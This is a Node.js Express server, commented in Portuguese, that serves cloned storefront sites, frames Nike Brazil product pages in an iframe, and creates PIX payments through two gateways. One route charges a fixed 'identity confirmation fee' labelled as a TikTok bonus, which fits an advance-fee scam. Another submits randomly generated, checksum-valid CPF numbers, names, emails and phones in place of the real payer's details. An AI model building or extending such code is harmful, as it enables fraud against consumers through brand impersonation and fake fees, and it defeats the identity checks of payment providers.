const express = require('express');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const GHOSTSPAY_SECRET_KEY = process.env.GHOSTSPAY_SECRET_KEY || '';
const GHOSTSPAY_COMPANY_ID = process.env.GHOSTSPAY_COMPANY_ID || '';
const GHOSTSPAY_POSTBACK_URL = process.env.GHOSTSPAY_POSTBACK_URL || '';
const GHOSTSPAY_BASE_URL = 'https://api.ghostspaysv2.com/functions/v1';

// Config Paradise (PIX)
const PARADISE_API_KEY = process.env.PARADISE_API_KEY || '';
// PARADISE_PRODUCT_HASH deixado opcional, caso a Paradise volte a exigir em algum fluxo
const PARADISE_PRODUCT_HASH = process.env.PARADISE_PRODUCT_HASH || '';
// Valor padrão opcional; se não vier amountCents do frontend, pode usar este fallback
const PARADISE_AMOUNT_CENTS = Number(process.env.PARADISE_AMOUNT_CENTS || '0'); // ex: 1000 = R$ 10,00
const PARADISE_UPSELL_URL = process.env.PARADISE_UPSELL_URL || '';

if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
  console.warn(
    '[GhostsPays] Atenção: defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID no .env para habilitar a criação real de pagamentos.'
  );
}

app.use(express.json());

// Servir clone premiaon na raiz (apenas se index.html existir)
const premiaonRoot = path.join(__dirname, 'clones', 'premiaon.vercel.app');
const premiaonIndex = path.join(premiaonRoot, 'index.html');
if (fs.existsSync(premiaonIndex)) {
  app.use(express.static(premiaonRoot));
} else {
  app.get('/', (req, res) => res.redirect('/cuidadoconelperro/'));
}

// Clone (base) — página de produto: iframe para URL Nike (product?nike=...) ou antigo products/:handle
function serveProductIframe(req, res) {
  const nikeUrl = req.query.nike;
  if (nikeUrl && typeof nikeUrl === 'string') {
    try {
      const u = new URL(nikeUrl);
      if (u.hostname === 'www.nike.com.br' || u.hostname === 'nike.com.br') {
        const html = `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8"/><title>Produto – Nike</title><style>html,body{margin:0;height:100%;}iframe{border:0;width:100%;height:100%;}</style></head><body><iframe id="product-frame" src="${u.href.replace(/"/g, '&quot;')}" loading="eager"></iframe></body></html>`;
        return res.type('html').send(html);
      }
    } catch (_) {}
  }
  res.redirect('/cuidadoconelperro/');
}
app.get('/cuidadoconelperro/product', serveProductIframe);

const ccpBase = 'https://cuidadoconelperromx.site';
function serveCcpProductIframe(req, res) {
  const handle = (req.params.handle || '').replace(/[^a-z0-9-]/gi, '');
  const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
  const iframeSrc = handle ? ccpBase + '/products/' + handle + qs : ccpBase;
  const html = `<!doctype html><html lang="es"><head><meta charset="utf-8"/><title>Producto</title><style>html,body{margin:0;height:100%;}iframe{border:0;width:100%;height:100%;}</style></head><body><iframe id="product-frame" src="${iframeSrc}" loading="eager"></iframe></body></html>`;
  res.type('html').send(html);
}
app.get('/cuidadoconelperro/products/:handle', serveCcpProductIframe);
app.get('/cuidadoconelperro/products/:handle/', serveCcpProductIframe);
app.use('/cuidadoconelperro', express.static(path.join(__dirname, 'clones', 'cuidadoconelperromx.site')));

function buildAuthHeader() {
  const credentials = Buffer.from(`${GHOSTSPAY_SECRET_KEY}:${GHOSTSPAY_COMPANY_ID}`).toString('base64');
  return `Basic ${credentials}`;
}

async function callGhostsPays(endpoint, options) {
  const url = `${GHOSTSPAY_BASE_URL}${endpoint}`;
  const resp = await fetch(url, options);
  const text = await resp.text();
  let json;
  try {
    json = text ? JSON.parse(text) : null;
  } catch (e) {
    json = { raw: text };
  }
  return { status: resp.status, body: json };
}

function normalizePixResponse(body) {
  if (!body || typeof body !== 'object') return body;
  const data = body.data || body;
  const id = body.id ?? data.id ?? body.transactionId ?? data.transactionId;
  const amount = body.amount ?? data.amount;
  const status = body.status ?? data.status ?? 'waiting_payment';
  const pixBlock = body.pix ?? data.pix ?? body.pixPayment ?? data.pixPayment ?? {};
  const qrcode =
    pixBlock.qrcode ?? pixBlock.qrCode ?? pixBlock.qrcodeImage ?? body.qrcode ?? data.qrcode ?? (typeof pixBlock.image === 'string' ? pixBlock.image : null);
  const qrcodeText =
    pixBlock.qrcodeText ?? pixBlock.copyPaste ?? pixBlock.brCode ?? pixBlock.pixKey ?? body.qrcodeText ?? body.brCode ?? data.qrcodeText ?? data.brCode ?? (typeof pixBlock.text === 'string' ? pixBlock.text : null);
  return {
    id,
    amount,
    status,
    pix: { qrcode: qrcode || null, qrcodeText: qrcodeText || null }
  };
}

// ==== Helpers Paradise PIX ====
function generateRandomCpf() {
  const rand = () => Math.floor(Math.random() * 9);
  const n = Array.from({ length: 9 }, rand);
  const calcDigit = (base) => {
    let sum = 0;
    for (let i = 0; i < base.length; i += 1) {
      sum += base[i] * (base.length + 1 - i);
    }
    const mod = sum % 11;
    return mod < 2 ? 0 : 11 - mod;
  };
  const d1 = calcDigit(n);
  const d2 = calcDigit([...n, d1]);
  return [...n, d1, d2].join('');
}

function randomEmail() {
  const ts = Date.now();
  const rnd = Math.floor(Math.random() * 100000);
  return `cliente_${ts}_${rnd}@email.com`;
}

function randomPhone() {
  // DDD 11 + 9 dígitos genéricos
  const base = '1199';
  let rest = '';
  for (let i = 0; i < 7; i += 1) {
    rest += Math.floor(Math.random() * 10);
  }
  return base + rest;
}

function randomName() {
  const first = ['João', 'Maria', 'Carlos', 'Ana', 'Paulo', 'Fernanda'];
  const last = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Costa', 'Almeida'];
  return (
    first[Math.floor(Math.random() * first.length)] +
    ' ' +
    last[Math.floor(Math.random() * last.length)]
  );
}

function normalizeParadisePix(body) {
  if (!body || typeof body !== 'object') return body;
  const data = body.data || body;
  const externalId = data.external_id || data.externalId || data.hash || data.id;
  const pixBlock = data.pix || data.payment || data.pixPayment || {};
  const qrcode =
    pixBlock.qrcode ||
    pixBlock.qrCode ||
    pixBlock.image ||
    pixBlock.qrcodeImage ||
    data.qrcode ||
    data.qrCode ||
    null;
  const qrcodeText =
    pixBlock.qrcode_text ||
    pixBlock.qrcodeText ||
    pixBlock.copyPaste ||
    pixBlock.brCode ||
    data.qrcode_text ||
    data.qrcodeText ||
    data.brCode ||
    null;
  return {
    externalId,
    pix: {
      qrcode: qrcode || null,
      qrcodeText: qrcodeText || null
    },
    raw: data
  };
}

if (!PARADISE_API_KEY || !PARADISE_UPSELL_URL) {
  console.warn(
    '[Paradise] Atenção: defina PARADISE_API_KEY e PARADISE_UPSELL_URL no .env para habilitar o PIX Paradise. PARADISE_AMOUNT_CENTS é opcional (pode vir do frontend).'
  );
}

// Cria um pagamento PIX fixo para a taxa de confirmação (R$ 39,56) — payload conforme doc GhostsPays
app.post('/api/ghostspay/pix-taxa', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const amount = 3956; // R$ 39,56 em centavos
  const bodyReq = typeof req.body === 'object' ? req.body || {} : {};
  const chaveRaw = (bodyReq.chave || '').toString().trim();
  const tipo = (bodyReq.tipo || 'cpf').toLowerCase();
  const apenasDigitos = (chaveRaw || '').replace(/\D/g, '');
  const cpfNumero = apenasDigitos.length >= 11 ? apenasDigitos.slice(0, 11) : (apenasDigitos.length > 0 ? apenasDigitos : null);
  if (!cpfNumero || cpfNumero.length < 11) {
    return res.status(400).json({
      error: { code: 'CHAVE_OBRIGATORIA', message: 'Informe a chave PIX (CPF com 11 dígitos, e-mail ou telefone).' }
    });
  }
  const nomeExibicao = chaveRaw || cpfNumero;
  const emailCliente = tipo === 'email' && chaveRaw.indexOf('@') >= 0 ? chaveRaw : `cpf${cpfNumero}@example.com`;
  const phoneCliente = tipo === 'numero' && apenasDigitos.length >= 10 ? apenasDigitos.slice(0, 11) : '11999999999';

  const payload = {
    customer: {
      name: nomeExibicao,
      email: emailCliente,
      phone: phoneCliente,
      document: { number: cpfNumero, type: 'CPF' }
    },
    paymentMethod: 'PIX',
    amount,
    items: [
      {
        title: 'Taxa de confirmação de identidade',
        unitPrice: amount,
        quantity: 1
      }
    ],
    pix: { expiresInDays: 1 },
    description: 'Taxa de confirmação TikTok Bônus'
  };

  if (GHOSTSPAY_POSTBACK_URL) {
    payload.postbackUrl = GHOSTSPAY_POSTBACK_URL;
  }

  try {
    const { status, body } = await callGhostsPays('/transactions', {
      method: 'POST',
      headers: {
        Authorization: buildAuthHeader(),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (status >= 200 && status < 300) {
      return res.status(status).json(normalizePixResponse(body));
    }
    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Consulta de status de uma transação (usado opcionalmente pelo fluxo "Já paguei")
app.get('/api/ghostspay/transactions/:id', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const id = req.params.id;
  try {
    const { status, body } = await callGhostsPays(`/transactions/${id}`, {
      method: 'GET',
      headers: {
        Authorization: buildAuthHeader()
      }
    });
    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao consultar transação:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Cria transação PIX Paradise (proxy seguro)
app.post('/api/paradise/create_pix', async (req, res) => {
  if (!PARADISE_API_KEY) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CONFIG',
        message: 'Configuração Paradise ausente. Verifique variáveis de ambiente.'
      }
    });
  }

  const bodyReq = typeof req.body === 'object' ? req.body || {} : {};
  const amountFromBody = Number(bodyReq.amountCents || 0);
  const amount = amountFromBody > 0 ? amountFromBody : PARADISE_AMOUNT_CENTS;
  if (!amount || amount <= 0) {
    return res.status(400).json({
      error: {
        code: 'MISSING_AMOUNT',
        message: 'Valor em centavos (amountCents) obrigatório.'
      }
    });
  }

  const cpf = generateRandomCpf();
  const email = randomEmail();
  const name = randomName();
  const phone = randomPhone();

  const description =
    typeof bodyReq.description === 'string' && bodyReq.description.trim().length > 0
      ? bodyReq.description.trim()
      : 'Pedido DireitaStore';

  const payload = {
    amount,
    description,
    customer: {
      name,
      email,
      document: cpf,
      phone
    }
  };

  try {
    const resp = await fetch('https://multi.paradisepags.com/api/v1/transaction.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': PARADISE_API_KEY
      },
      body: JSON.stringify(payload)
    });
    const text = await resp.text();
    let json;
    try {
      json = text ? JSON.parse(text) : null;
    } catch (e) {
      json = { raw: text };
    }
    if (resp.status < 200 || resp.status >= 300) {
      return res.status(resp.status).json({ error: { code: 'PARADISE_ERROR', body: json } });
    }
    const normalized = normalizeParadisePix(json);
    if (!normalized.externalId) {
      return res.status(500).json({
        error: { code: 'MISSING_EXTERNAL_ID', message: 'Resposta Paradise sem external_id/hash.' },
        body: json
      });
    }
    res.json({
      ok: true,
      externalId: normalized.externalId,
      pix: normalized.pix
    });
  } catch (e) {
    console.error('[Paradise] Erro ao criar PIX:', e);
    res.status(500).json({
      error: { code: 'INTERNAL_ERROR', message: 'Falha ao comunicar com a API Paradise.' }
    });
  }
});

// Verifica status da transação Paradise
app.get('/api/paradise/check_status/:hash', async (req, res) => {
  if (!PARADISE_API_KEY) {
    return res.status(500).json({
      error: { code: 'MISSING_CONFIG', message: 'Configuração Paradise ausente.' }
    });
  }
  const hash = req.params.hash;
  if (!hash) {
    return res.status(400).json({ error: { code: 'MISSING_HASH', message: 'Hash obrigatório.' } });
  }
  try {
    const url = `https://multi.paradisepags.com/api/v1/check_status.php?hash=${encodeURIComponent(hash)}`;
    const resp = await fetch(url, {
      method: 'GET',
      headers: {
        'X-API-Key': PARADISE_API_KEY
      }
    });
    const text = await resp.text();
    let json;
    try {
      json = text ? JSON.parse(text) : null;
    } catch (e) {
      json = { raw: text };
    }
    const status = (json && (json.status || json.payment_status || json.state)) || 'pending';
    if (status === 'paid') {
      const response = { status: 'paid' };
      if (PARADISE_UPSELL_URL) {
        response.redirect_url = PARADISE_UPSELL_URL;
      }
      return res.json(response);
    }
    return res.json({ status: 'pending' });
  } catch (e) {
    console.error('[Paradise] Erro ao consultar status:', e);
    res.status(500).json({
      error: { code: 'INTERNAL_ERROR', message: 'Falha ao consultar status na API Paradise.' }
    });
  }
});

// Fallback para servir a página principal caso acessem rotas desconhecidas via navegador
app.get('*', (req, res) => {
  res.redirect('/cuidadoconelperro/');
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});

